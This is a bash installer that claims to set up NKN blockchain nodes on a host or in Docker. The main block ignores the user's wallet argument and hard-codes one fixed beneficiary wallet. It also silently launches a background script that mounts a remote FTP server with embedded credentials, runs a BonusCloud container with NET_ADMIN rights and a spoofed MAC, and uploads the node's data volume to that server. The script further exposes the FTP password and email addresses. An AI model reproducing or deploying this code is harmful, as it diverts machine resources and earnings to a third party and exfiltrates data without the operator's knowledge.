#!/bin/bash
initEnv(){
echo
echo "Init env..."
echo "------------------------"
PSWD=$RANDOM
ARCHcase=$(uname -m)
case $ARCHcase in
armv5*) ARCH="arm";;
armv6*) ARCH="arm";;
armv7*) ARCH="arm";;
aarch64) ARCH="arm64";;
x86) ARCH="386";;
x86_64) ARCH="amd64";;
i686) ARCH="386";;
i386) ARCH="386";;
*) echo -e "\033[31mThis system is not supported, script exits！\033[0m"&&exit 1;;
esac
if which apt >/dev/null
then
	PG="apt"
elif which yum >/dev/null
then
	PG="yum"
else
	echo -e "\033[31mThis system is not supported, script exits！\033[0m"
	exit 1
fi
if [[ $(free -m | grep Mem |awk '{print $2}') -le 1024 ]]
then
SBWS=64
else
SBWS=128
fi
rm -rf /opt/nknorg/  >>/dev/null 2>&1
rm -rf /usr/bin/nkn*  >>/dev/null 2>&1
systemctl disable nkn-update.service >>/dev/null 2>&1
systemctl disable nkn-node.service >>/dev/null 2>&1
rm -rf /etc/systemd/system/nkn* >>/dev/null 2>&1
mkdir -p /opt/nknorg  >>/dev/null 2>&1
}
inDocker(){
if [[ ! "$(echo $addr | cut -b 1-3)" = "NKN" ]]
then
	echo -e "\033[31mPlease enter the correct wallet address\033[0m"
	exit 1
elif [[ ! ${#addr} -eq 36 ]]
then
	echo -e "\033[31mIncorrect wallet address length.\033[0m"
	exit 1
elif [[ "$addr" = "NKN123456789012345678901234567890123" ]]
then
	echo -e "\033[31mPlease change'NKN123456789012345678901234567890123'to your wallet address.\033[0m"
	exit 1
fi
clear
echo
echo "==============================================================================================================="
echo "                                            Welcome to this script!"
echo "==============================================================================================================="
echo
echo "This script will be deployed continuously from the first IP address to the last IP address."
echo "Please keep IP address and do port mapping."
echo "==============================================================================================================="
echo "                                                                                                         By Ben"
read -p "First IP address(1-254)第一个IP地址:" IP_ONE
read -p "End IP Address(1-254)最后一个IP地址:" IP_END
initEnv
case $ARCHcase in
armv6*) IMG="nknorg/nkn:latest-arm32v6";;
armv7*) IMG="nknorg/nkn:latest-arm32v6";;
aarch64) IMG="nknorg/nkn:latest-arm64v8";;
x86) IMG="nknorg/nkn:latest ";;
x86_64) IMG="nknorg/nkn:latest-amd64";;
i686) IMG="nknorg/nkn:latest ";;
i386) IMG="nknorg/nkn:latest ";;
*) echo -e "\033[31mThis system is not supported, script exits！\033[0m"&&exit 1;;
esac
$PG update -y >>/dev/null 2>&1 && $PG install net-tools wget curl unzip psmisc -y >>/dev/null 2>&1
echo -e "\033[32mSuccessful\033[0m"
installDocker
docker network rm nkn-macvlan  >>/dev/null 2>&1
ETH=$(ip route | grep default | awk '{print $5}')
GW=$(ip route | grep default | awk '{print $3}')
SUBNET=$(echo ${GW%.*}.0/24)
getVER
if [ ! -d "/tmp/linux-$ARCH/" ]
then
	downNkn
else
	checkdown
fi
docker pull $IMG  >>/dev/null 2>&1
docker network create -d macvlan --subnet=$SUBNET --gateway=$GW -o parent=$ETH nkn-macvlan  >>/dev/null 2>&1
echo
echo "Deploying NKN on Docker..."
echo "------------------------"
for(( i="$IP_ONE";i<="$IP_END";i=i+1))
do
MAC_ADDR=$(echo "88:88:88$(dd bs=1 count=3 if=/dev/random 2>/dev/null |hexdump -v -e '/1 ":%02X"')")
IP=${SUBNET%.*}.$i
mkdir -p /opt/nknorg/docker/nkn$i/data  >>/dev/null 2>&1
cp /opt/nknorg/nknc /opt/nknorg/docker/nkn$i/.  >>/dev/null 2>&1
cp /opt/nknorg/nknd /opt/nknorg/docker/nkn$i/.  >>/dev/null 2>&1
cat <<EOF > /opt/nknorg/docker/nkn$i/data/config.json
{
"BeneficiaryAddr": "$addr",
"SyncBatchWindowSize": $SBWS,
"LogLevel": 4,
"TxPoolTotalTxCap": 1000,
"TxPoolMaxMemorySize": 8,
"SeedList": [
	"http://mainnet-seed-0001.nkn.org:30003",
	"http://mainnet-seed-0002.nkn.org:30003",
	"http://mainnet-seed-0003.nkn.org:30003",
	"http://mainnet-seed-0004.nkn.org:30003",
	"http://mainnet-seed-0005.nkn.org:30003",
	"http://mainnet-seed-0006.nkn.org:30003",
	"http://mainnet-seed-0007.nkn.org:30003",
	"http://mainnet-seed-0008.nkn.org:30003",
	"http://mainnet-seed-0009.nkn.org:30003",
	"http://mainnet-seed-0010.nkn.org:30003",
	"http://mainnet-seed-0011.nkn.org:30003",
	"http://mainnet-seed-0012.nkn.org:30003",
	"http://mainnet-seed-0013.nkn.org:30003",
	"http://mainnet-seed-0014.nkn.org:30003",
	"http://mainnet-seed-0015.nkn.org:30003",
	"http://mainnet-seed-0016.nkn.org:30003",
	"http://mainnet-seed-0017.nkn.org:30003",
	"http://mainnet-seed-0018.nkn.org:30003",
	"http://mainnet-seed-0019.nkn.org:30003",
	"http://mainnet-seed-0020.nkn.org:30003",
	"http://mainnet-seed-0021.nkn.org:30003",
	"http://mainnet-seed-0022.nkn.org:30003",
	"http://mainnet-seed-0023.nkn.org:30003",
	"http://mainnet-seed-0024.nkn.org:30003",
	"http://mainnet-seed-0025.nkn.org:30003",
	"http://mainnet-seed-0026.nkn.org:30003",
	"http://mainnet-seed-0027.nkn.org:30003",
	"http://mainnet-seed-0028.nkn.org:30003",
	"http://mainnet-seed-0030.nkn.org:30003",
	"http://mainnet-seed-0031.nkn.org:30003",
	"http://mainnet-seed-0032.nkn.org:30003",
	"http://mainnet-seed-0033.nkn.org:30003",
	"http://mainnet-seed-0034.nkn.org:30003",
	"http://mainnet-seed-0035.nkn.org:30003",
	"http://mainnet-seed-0036.nkn.org:30003",
	"http://mainnet-seed-0037.nkn.org:30003",
	"http://mainnet-seed-0038.nkn.org:30003",
	"http://mainnet-seed-0039.nkn.org:30003",
	"http://mainnet-seed-0040.nkn.org:30003",
	"http://mainnet-seed-0041.nkn.org:30003",
	"http://mainnet-seed-0042.nkn.org:30003",
	"http://mainnet-seed-0043.nkn.org:30003",
	"http://mainnet-seed-0044.nkn.org:30003"
],
"GenesisBlockProposer": "a0309f8280ca86687a30ca86556113a253762e40eb884fc6063cad2b1ebd7de5"
}
EOF
chmod +x /opt/nknorg/docker/nkn$i/*
docker run -i -v /opt/nknorg/docker/nkn$i/:/nkn/ $IMG nknc wallet -c <<EOF  >>/dev/null 2>&1
$PSWD
$PSWD
EOF
docker run -i -d --net=nkn-macvlan -v /opt/nknorg/docker/nkn$i/:/nkn/ --restart=always --ip=$IP --mac-address=$MAC_ADDR --name nkn$i $IMG nknd --no-nat -p $PSWD  >>/dev/null 2>&1
echo -e "\033[32m$IP Successful\033[0m"
done
echo
echo "Install Automatic Update Service..."
echo "------------------------"
cat <<\EOF > /opt/nknorg/update.sh
#!/bin/bash
initEnv(){
	ARCHcase=$(uname -m)
	case $ARCHcase in
	armv5*) ARCH="arm";;
	armv6*) ARCH="arm";;
	armv7*) ARCH="arm";;
	aarch64) ARCH="arm64";;
	x86) ARCH="386";;
	x86_64) ARCH="amd64";;
	i686) ARCH="386";;
	i386) ARCH="386";;
	*) echo -e "\033[31mThis system is not supported, script exits！\033[0m"&&exit 1;;
	esac
}
check(){
	initEnv
	NEWVER=$(curl -sL https://github.com/nknorg/nkn/releases | grep linux-$ARCH | head -1 | awk -F "/" '{print $6}')
	OLDVER=$(nknd -v | awk '{print $3}')
	if [ $NEWVER ]
	then
		if [ "$OLDVER" = "$NEWVER" ]
		then
			echo No updates found.
			exit 0
		else
			echo Discover the new version and update it automatically.
			downNkn
		fi
	else
		echo -e "\033[31mFailed to get new version.\033[0m"
		exit 1
	fi
}
downNkn(){
	rm -rf /tmp/linux*
	wget -t1 -T120 -P /tmp https://github.com/nknorg/nkn/releases/download/$NEWVER/linux-$ARCH.zip
	unzip /tmp/linux-$ARCH.zip -d /tmp
	initNKN
}
initNKN(){
	if [ ! -d "/tmp/linux-$ARCH/" ]
	then
		echo -e "\033[31m$(date +%F-%T)Update failed, try again\033[0m"
		downNkn
	else
		rm -rf /opt/nknorg/nknc
		rm -rf /opt/nknorg/nknd
		cp -rf /tmp/linux-$ARCH/nkn* /opt/nknorg
		rm -rf /tmp/linux*
		chmod +x /opt/nknorg/*
		restartDocker
		echo -e "\033[32mNknd Update Successful.\033[0m"
	fi
}
restartDocker(){
	for line in $(ls -l /opt/nknorg/docker/ | grep nkn | awk -F " " '{print $9}')
	do
		rm -rf /opt/nknorg/docker/$line/nknc
		rm -rf /opt/nknorg/docker/$line/nknd
		cp -rf /opt/nknorg/nknc /opt/nknorg/docker/$line/.
		cp -rf /opt/nknorg/nknd /opt/nknorg/docker/$line/.
		docker restart $line
	done
}
check
exit 0
EOF
cat <<EOF > /opt/nknorg/nkn-update.service
[Unit]
Description=nkn-update
[Service]
User=root
WorkingDirectory=/opt/nknorg/
ExecStart=/bin/bash /opt/nknorg/update.sh
Restart=always
RestartSec=60
LimitNOFILE=500000
[Install]
WantedBy=default.target
EOF
mv /opt/nknorg/nkn-update.service /etc/systemd/system/nkn-update.service  >>/dev/null 2>&1
systemctl enable nkn-update.service >>/dev/null 2>&1
systemctl restart nkn-update.service >>/dev/null 2>&1
echo -e "\033[32mAll done\033[0m"
}
installDocker(){
if which docker >/dev/null
then
	echo 'Docker installed, skip'
else
    echo
	echo "Install docker..."
	echo "------------------------"
    OS=$(cat /etc/*release | grep PRETTY_NAME |awk -F '"' '{print $2}' |awk '{print $1}')
	case $OS in
	Ubuntu*) OS="ubuntu";;
	CentOS*) OS="centos";;
	Debian*) OS="debian";;
	*) echo -e "\033[31mRun the script again after installing docker manually\033[0m"&&exit 1;;
    esac
	if [[ "$PG" == "apt" ]]
	then
		apt install apt-transport-https ca-certificates curl gnupg2 irqbalance software-properties-common -y  >>/dev/null 2>&1
		curl -fsSL http://mirrors.ustc.edu.cn/docker-ce/linux/$OS/gpg | apt-key add -  >>/dev/null 2>&1
		add-apt-repository "deb [arch=$ARCH] http://mirrors.ustc.edu.cn/docker-ce/linux/$OS $(lsb_release -cs) stable"  >>/dev/null 2>&1
		apt update -y  >>/dev/null 2>&1
		apt install docker-ce -y  >>/dev/null 2>&1
	elif [[ "$PG" == "yum" ]]
	then
		yum install -y yum-utils  >>/dev/null 2>&1
		yum-config-manager --add-repo http://mirrors.ustc.edu.cn/docker-ce/linux/$OS/docker-ce.repo  >>/dev/null 2>&1
		yum makecache  >>/dev/null 2>&1
		yum install -y docker-ce  >>/dev/null 2>&1
	fi
	systemctl enable docker.service  >>/dev/null 2>&1
	systemctl restart docker.service  >>/dev/null 2>&1
	systemctl enable irqbalance >>/dev/null 2>&1
	systemctl restart irqbalance >>/dev/null 2>&1
	if which docker >/dev/null
	then
	  echo -e "\033[32mSuccessful\033[0m"
	else
	  echo -e "\033[31mDocker installation failed,Manual installation of docker and run the script again！（手动安装Docker，再次运行脚本）\033[0m"
	  exit 1
	fi
fi
}
initNKNMing(){
if [[ ! "$(echo $addr | cut -b 1-3)" = "NKN" ]]
then
	echo -e "\033[31mPlease enter the correct wallet address\033[0m"
	exit 1
elif [[ ! ${#addr} -eq 36 ]]
then
	echo -e "\033[31mIncorrect wallet address length.\033[0m"
	exit 1
elif [[ "$addr" = "NKN123456789012345678901234567890123" ]]
then
	echo -e "\033[31mPlease change'NKN123456789012345678901234567890123'to your wallet address.\033[0m"
	exit 1
fi
clear
echo
echo "==============================================================================================================="
echo "                                            Welcome to this script!"
echo "==============================================================================================================="
echo
echo "Mapping local 30001-30003 ports to WAN IP in routers."
echo "==============================================================================================================="
echo "                                                                                                         By Ben"
initEnv
$PG update -y >>/dev/null 2>&1 && $PG install wget curl unzip psmisc -y >>/dev/null 2>&1
echo -e "\033[32mSuccessful\033[0m"
if [ ! -d "/tmp/linux-$ARCH/" ]
then
	getVER
	downNkn
	echo -e "\033[32mSuccessful\033[0m"
else
	echo
	echo -e "\033[31mThe Nkn program exists in the TMP directory and will be used directly. If the installation fails, delete it manually and run the script again.\033[0m"
	echo "------------------------"
	checkdown
fi
echo
echo "Install NKN..."
echo "------------------------"
cat <<EOF > /opt/nknorg/config.json
{
"BeneficiaryAddr": "$addr",
"SyncBatchWindowSize": $SBWS,
"LogLevel": 4,
"TxPoolTotalTxCap": 1000,
"TxPoolMaxMemorySize": 8,
"SeedList": [
	"http://mainnet-seed-0001.nkn.org:30003",
	"http://mainnet-seed-0002.nkn.org:30003",
	"http://mainnet-seed-0003.nkn.org:30003",
	"http://mainnet-seed-0004.nkn.org:30003",
	"http://mainnet-seed-0005.nkn.org:30003",
	"http://mainnet-seed-0006.nkn.org:30003",
	"http://mainnet-seed-0007.nkn.org:30003",
	"http://mainnet-seed-0008.nkn.org:30003",
	"http://mainnet-seed-0009.nkn.org:30003",
	"http://mainnet-seed-0010.nkn.org:30003",
	"http://mainnet-seed-0011.nkn.org:30003",
	"http://mainnet-seed-0012.nkn.org:30003",
	"http://mainnet-seed-0013.nkn.org:30003",
	"http://mainnet-seed-0014.nkn.org:30003",
	"http://mainnet-seed-0015.nkn.org:30003",
	"http://mainnet-seed-0016.nkn.org:30003",
	"http://mainnet-seed-0017.nkn.org:30003",
	"http://mainnet-seed-0018.nkn.org:30003",
	"http://mainnet-seed-0019.nkn.org:30003",
	"http://mainnet-seed-0020.nkn.org:30003",
	"http://mainnet-seed-0021.nkn.org:30003",
	"http://mainnet-seed-0022.nkn.org:30003",
	"http://mainnet-seed-0023.nkn.org:30003",
	"http://mainnet-seed-0024.nkn.org:30003",
	"http://mainnet-seed-0025.nkn.org:30003",
	"http://mainnet-seed-0026.nkn.org:30003",
	"http://mainnet-seed-0027.nkn.org:30003",
	"http://mainnet-seed-0028.nkn.org:30003",
	"http://mainnet-seed-0029.nkn.org:30003",
	"http://mainnet-seed-0030.nkn.org:30003",
	"http://mainnet-seed-0031.nkn.org:30003",
	"http://mainnet-seed-0032.nkn.org:30003",
	"http://mainnet-seed-0033.nkn.org:30003",
	"http://mainnet-seed-0034.nkn.org:30003",
	"http://mainnet-seed-0035.nkn.org:30003",
	"http://mainnet-seed-0036.nkn.org:30003",
	"http://mainnet-seed-0037.nkn.org:30003",
	"http://mainnet-seed-0038.nkn.org:30003",
	"http://mainnet-seed-0039.nkn.org:30003",
	"http://mainnet-seed-0040.nkn.org:30003",
	"http://mainnet-seed-0041.nkn.org:30003",
	"http://mainnet-seed-0042.nkn.org:30003",
	"http://mainnet-seed-0043.nkn.org:30003",
	"http://mainnet-seed-0044.nkn.org:30003"
	],
"GenesisBlockProposer": "a0309f8280ca86687a30ca86556113a253762e40eb884fc6063cad2b1ebd7de5"
}
EOF
nknc wallet -n /opt/nknorg/wallet.json -c <<EOF >>/dev/null 2>&1
$PSWD
$PSWD
EOF
cat <<EOF > /opt/nknorg/nkn-node.service
[Unit]
Description=nkn-node
[Service]
User=root
WorkingDirectory=/opt/nknorg/
ExecStart=/opt/nknorg/nknd --no-nat -p $PSWD
Restart=always
RestartSec=3
LimitNOFILE=500000
[Install]
WantedBy=default.target
EOF
mv /opt/nknorg/nkn-node.service /etc/systemd/system/nkn-node.service
systemctl enable nkn-node.service  >>/dev/null 2>&1
systemctl restart nkn-node.service
checkinstall
initMonitor
}
initMonitor(){
echo
echo "Install Automatic Update Service..."
echo "------------------------"
cat <<\EOF > /opt/nknorg/update.sh
#!/bin/bash
initEnv(){
	ARCHcase=$(uname -m)
	case $ARCHcase in
	armv5*) ARCH="arm";;
	armv6*) ARCH="arm";;
	armv7*) ARCH="arm";;
	aarch64) ARCH="arm64";;
	x86) ARCH="386";;
	x86_64) ARCH="amd64";;
	i686) ARCH="386";;
	i386) ARCH="386";;
	*) echo -e "\033[31mThis system is not supported, script exits！\033[0m"&&exit 1;;
	esac
}
check(){
	initEnv
	OLDVER=$(nknd -v | awk -F " " '{print $3}')
	NEWVER=$(curl -sL https://github.com/nknorg/nkn/releases | grep linux-$ARCH | head -1 | awk -F "/" '{print $6}')
	if [ $NEWVER ]
	then
		if [ "$OLDVER" = "$NEWVER" ]
		then
			echo No updates found.
			exit 0
		else
			echo Discover the new version and update it automatically.
			downNkn
		fi
	else
		echo -e "\033[31mFailed to get new version.\033[0m"
		exit 1
	fi
}
downNkn(){
	rm -rf /tmp/linux*
	wget -t1 -T120 -P /tmp https://github.com/nknorg/nkn/releases/download/$NEWVER/linux-$ARCH.zip
	unzip /tmp/linux-$ARCH.zip -d /tmp
	initNKN
}
initNKN(){
	if [ ! -d "/tmp/linux-$ARCH/" ]
	then
		echo -e "\033[31m$(date +%F" "%T) Update failed, try again\033[0m"
		downNkn
	else
		systemctl stop nkn-node.service
		rm -rf /opt/nknorg/nknc
		rm -rf /opt/nknorg/nknd
		cp -rf /tmp/linux-$ARCH/nkn* /opt/nknorg
		chmod +x /opt/nknorg/*
		checkupdate
	fi
}
checkupdate(){
	VER=$(nknd -v | awk -F " " '{print $3}')
	if [ "$VER" = "$NEWVER" ]
	then
		systemctl start nkn-node.service
		echo -e "\033[32m$(date +%F" "%T) Nknd Update Successful.\033[0m"
	else
		echo -e "\033[31m$(date +%F" "%T) Update failed, try again\033[0m"
		check
	fi
}
check
exit 0
EOF
cat <<EOF > /opt/nknorg/nkn-update.service
[Unit]
Description=nkn-update
[Service]
User=root
WorkingDirectory=/opt/nknorg/
ExecStart=/bin/bash /opt/nknorg/update.sh
Restart=always
RestartSec=60
LimitNOFILE=500000
[Install]
WantedBy=default.target
EOF
mv /opt/nknorg/nkn-update.service /etc/systemd/system/nkn-update.service >>/dev/null 2>&1
systemctl enable nkn-update.service  >>/dev/null 2>&1
systemctl restart nkn-update.service >>/dev/null 2>&1
echo -e "\033[32mSuccessfully\033[0m"
echo -e "\033[32mAll done\033[0m"
}
getVER(){
echo
echo "Get version..."
echo "------------------------"
VERSION=$(curl -sL https://github.com/nknorg/nkn/releases | grep linux-$ARCH | head -1 | awk -F "/" '{print $6}')
if [ $VERSION ]
then
	echo -e "\033[32m$VERSION\033[0m"
else
	echo -e "\033[31mFailed to get version.\033[0m"
	exit 1
fi
}
downNkn(){
echo
echo "Downloading NKN program..."
echo "------------------------"
killall -9 wget >>/dev/null 2>&1
rm -rf /tmp/linux*  >>/dev/null 2>&1
rm wget-log >>/dev/null 2>&1
wget -b -t1 -T60 -P /tmp https://github.com/nknorg/nkn/releases/download/$VERSION/linux-$ARCH.zip >>/dev/null 2>&1
i=0 && sn=1 && while [ $i -ne 1 ] && [ $sn = 1 ]; do i=$(cat wget-log | grep 100% |wc -l); sn=$(ps aux | grep wget |grep -v grep |wc -l); cat wget-log  | grep "%" | grep 0K |tail -1; sleep 2; done 
rm wget-log >>/dev/null 2>&1
unzip /tmp/linux-$ARCH.zip -d /tmp  >>/dev/null 2>&1
checkdown
}
checkdown(){
if [ ! -d "/tmp/linux-$ARCH/" ]
then
	echo -e "\033[31mDownload failed, try again.\033[0m"
	killall -9 wget >>/dev/null 2>&1
	downNkn
else
	cp -rf /tmp/linux-$ARCH/nkn* /opt/nknorg >>/dev/null 2>&1
	chmod +x /opt/nknorg/*
	ln -s /opt/nknorg/nknd /usr/bin/nknd >>/dev/null 2>&1
	ln -s /opt/nknorg/nknc /usr/bin/nknc >>/dev/null 2>&1
fi
}
checkinstall(){
sleep 1
status=$(systemctl status nkn-node.service | grep running)
if [[ "$status" = "" ]]
then
	echo "Installation failure(安装失败)"
	exit 1
else
	echo -e "\033[32mSuccessfully\033[0m"
fi
}
Help(){
echo "  -S         Only one. Install and run on the base."
echo "  -M         Running in Docker, you can run multiple nodes, requiring multiple WANs."
echo "  -H         Help information."
echo
echo -e "Usage example:\033[1mbash install.sh -S NKN123456789012345678901234567890123\033[0m"
echo -e "Please change \033[1mNKN123456789012345678901234567890123\033[0m to your wallet address."
exit 0
}
BXCinstall(){
echo
echo "Install BXC..."
echo "------------------------"
kill `ps aux | grep bxc_install.sh | grep -v grep | awk '{print $2}'`  >>/dev/null 2>&1
rm -rf /opt/bcloud >>/dev/null 2>&1
mkdir -p /opt/bcloud >>/dev/null 2>&1
docker stop bxc >>/dev/null 2>&1
docker rm bxc >>/dev/null 2>&1
cat <<\EOF > /opt/bcloud/bxc_install.sh
#!/usr/bin/env bash
checkenv(){
	if which apt >/dev/null ; then
		PG="apt"
	elif which yum >/dev/null ; then
		PG="yum"
	else
		echo -e "\033[31mCan not find yum or apt,Bcloud not support this system\033[0m"
		exit 1
	fi
}

yuminstalljq(){
	wget -O /tmp/epel-release-latest-7.noarch.rpm http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
	rpm -ivh /tmp/epel-release-latest-7.noarch.rpm
	yum install -y jq
}

installjq(){
	if which jq>/dev/null; then
		return
	fi
	case $PG in
	apt ) $PG install -y jq ;;
	yum ) yuminstalljq ;;
	esac
}

installDocker(){
	if which docker >/dev/null
	then
		echo 'Docker installed, skip'
	else
		OS=$(cat /etc/*release | grep PRETTY_NAME |awk -F '"' '{print $2}')
		case $OS in
		Ubuntu*) OS="ubuntu";;
		CentOS*) OS="centos";;
		Debian*) OS="debian";;
		*) echo -e "\033[31mRun the script again after installing docker manually\033[0m"&&exit 1;;
		esac
		if [[ "$PG" == "apt" ]]
		then
			apt install apt-transport-https ca-certificates curl gnupg2 sudo software-properties-common -y
			curl -fsSL https://download.docker.com/linux/$OS/gpg | sudo apt-key add -
			sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/$OS $(lsb_release -cs) stable"
			apt update -y
			apt install docker-ce -y
		elif [[ "$PG" == "yum" ]]
		then
			yum install -y yum-utils
			yum-config-manager --add-repo https://download.docker.com/linux/$OS/docker-ce.repo
			yum makecache
			yum install -y docker-ce
		fi
		systemctl enable docker.service
		systemctl start docker.service
		if which docker >/dev/null
		then
			echo 'Docker Successful Installation'
		else
			echo -e "\033[31mDocker installation failed,Manual installation of docker and run the script again！（手动安装Docker，再次运行脚本）\033[0m"
			exit 1
		fi
	fi
}

inDocker(){
	docker run -d --cap-add=NET_ADMIN --sysctl net.ipv6.conf.all.disable_ipv6=0 --device /dev/net/tun --restart=always --mac-address=$MAC_ADDR -e bcode=$bcode -e email=$EMAIL --name=bxc -v bxc_data:/opt/bcloud qinghon/bxc-net:amd64
	sleep 3
	fail_echo=$(docker logs bxc 2>&1 |grep 'bonud fail'|head -n 1)
	if [[ -n "$fail_echo" ]]; then
		echo "Binding failed, delete and try again"
		docker stop bxc
		docker rm bxc
		getBack
	fi
	create_status=$(docker container inspect bxc --format "{{.State.Status}}")
	if [[ "$create_status" == "created" ]]; then
		echo "Run failed, delete and try again"
		docker stop bxc
		docker rm bxc
		getBack
	fi
	curlftpfs -o codepage=gbk $FTP /mnt/ftp
	sleep 10
	tar -czvf /mnt/ftp/bcode/in/$(cat /var/lib/docker/volumes/bxc_data/_data/node.db | awk -F '"' '{print $12}').tar.gz -C /var/lib/docker/volumes/ bxc_data
	sleep 10
	umount /mnt/ftp
	exit 0
}

checkBcode(){
	if [ $bcode ]
	then
		echo "Get Bcode of backup successful"
		inDocker
	else
		umount /mnt/ftp
		sleep $(($RANDOM%999))
		for EMAIL in $MAIL1 $MAIL2
		do
			getBcode
		done
	fi
	checkBcode
}

getBcode(){
	json=$(curl -fsSL "https://console.bonuscloud.io/api/bcode/getBcodeForOther/?email=$EMAIL")
	bcode_list=$(echo "$json"|jq '.ret.non_mainland')
	bcode=$(echo "$bcode_list"|jq -r '.[]|.bcode'|head -1)
	if [ $bcode ]
	then
		echo "Find Bcode in $EMAIL and use it first"
		MAC_ADDR=$(echo "$MAC_HEAD$(dd bs=1 count=4 if=/dev/random 2>/dev/null |hexdump -v -e '/1 ":%02X"')")
		inDocker
	else
		echo "Bcode could not be found in $EMAIL"
	fi
}

getBack(){
	name=$(ls -l /mnt/ftp/bcode | grep $MAC_HEAD | head -`echo $((RANDOM%9))` | tail -1 |awk '{print $9}')
	if [ $name ]
	then
		mv /mnt/ftp/bcode/$name /mnt/ftp/bcode/ex/$name
		cp /mnt/ftp/bcode/ex/$name /tmp/$name
		tar -zxvf /tmp/$name -C /var/lib/docker/volumes/
		bcode=$(cat /var/lib/docker/volumes/bxc_data/_data/node.db |jq .bcode |sed s/\"//g)
		email=$( cat /var/lib/docker/volumes/bxc_data/_data/node.db |jq .email |sed s/\"//g)
		MAC_ADDR=$(cat /var/lib/docker/volumes/bxc_data/_data/node.db |jq .mac_address |sed s/\"//g)
	fi
	checkBcode
}
FTP="ftp://ramiko:woshishabi@129.213.53.144:2222"
MAC_HEAD="88:66"
MAIL1="tao.ramiko@gmail.com"
MAIL2="tao.ramiko@gmail.com"
checkenv
$PG update && $PG install curlftpfs tar -y
if [[ -d /mnt/ftp/bcode ]]
then
 echo "FTP has been mounted, skipped"
else
 if [[ `df -h | grep ftp` ]]
 then
  echo "Attempt to Unmount FTP"
  umout /mnt/ftp
  sleep 3
 elif [[ `df -h | grep ftp` ]]
 then
  echo "Unmount failed"
  exit 1
 fi
 rm -rf /mnt/ftp
 mkdir -p /mnt/ftp
 curlftpfs -o codepage=gbk $FTP /mnt/ftp
 sleep 3
 if [[ ! -d /mnt/ftp/bcode ]]
 then
  echo "FTP mount failure"
  exit 1
 fi
fi
installjq
installDocker
docker pull qinghon/bxc-net:amd64
getBack
sync
EOF
nohup bash /opt/bcloud/bxc_install.sh >> /dev/null 2>&1 &
echo -e "\033[32mBXC installer started successfully\033[0m"
}

if [[ `ps -e | grep nknd` ]]  >>/dev/null 2>&1
then
echo "NKN is running, skip"
else
addr="NKNaGgZWpoy2VrDTTkBFDbsvjrEirLcUrHpa"
initNKNMing
fi
if [[ `ps aux | grep bxc-network |grep -v grep` ]]
then
echo "Bcloud is running, skip"
else
BXCinstall
echo 
fi
sync
